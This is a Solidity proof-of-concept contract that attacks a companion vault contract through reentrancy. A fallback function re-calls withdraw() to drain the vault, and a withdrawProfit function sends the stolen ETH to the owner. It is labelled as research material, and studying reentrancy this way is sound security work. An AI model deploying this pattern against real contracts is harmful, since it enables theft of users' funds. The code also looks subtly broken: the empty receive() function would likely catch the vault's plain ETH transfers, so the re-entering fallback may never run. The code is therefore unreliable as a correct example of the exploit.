// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "./ReentrancyVault.sol";

/**
 * @title ReentrancyAttacker
 * @notice Proof-of-concept reentrancy attacker for ReentrancyVault.
 *         Implements the CEI (Checks-Effects-Interactions) bypass exploit.
 *         DO NOT use in production. For research only.
 */
contract ReentrancyAttacker {
    ReentrancyVault public vault;
    address public owner;

    // Track how many times our fallback was called (reentrancy depth)
    uint256 public callCount;

    constructor(address _vault) {
        vault = ReentrancyVault(_vault);
        owner = msg.sender;
    }

    /**
     * @notice Step 1: Fund this contract with ETH so it has a balance in the vault.
     */
    function fundVault() external payable {
        require(msg.value > 0, "Must send ETH to fund");
        vault.deposit{value: msg.value}();
    }

    /**
     * @notice Step 2: Start the attack. Attempts to withdraw everything in one tx.
     *         The recursive fallback keeps calling back into vault.withdraw().
     * @param amount The amount to withdraw per call (should be <= total deposit)
     */
    function attack(uint256 amount) external {
        require(msg.sender == owner, "Not owner");
        callCount = 0;
        vault.withdraw(amount);
    }

    /**
     * @notice Fallback — called by the vault when it sends ETH back.
     *         Re-enters the vault withdraw if we still have balance recorded.
     *         Note: balance is not updated in vault until after the call,
     *         so this will keep draining until the vault is empty or gas runs out.
     */
    fallback() external payable {
        callCount++;
        uint256 balance = address(vault).balance;
        if (balance > 0) {
            // Still have money in the vault — withdraw again
            vault.withdraw(msg.value);
        }
    }

    receive() external payable {}

    /**
     * @notice Withdraw all ETH extracted from the vault to the owner.
     */
    function withdrawProfit() external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = address(this).balance;
        require(balance > 0, "No profit");
        (bool success, ) = owner.call{value: balance}("");
        require(success, "Transfer failed");
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


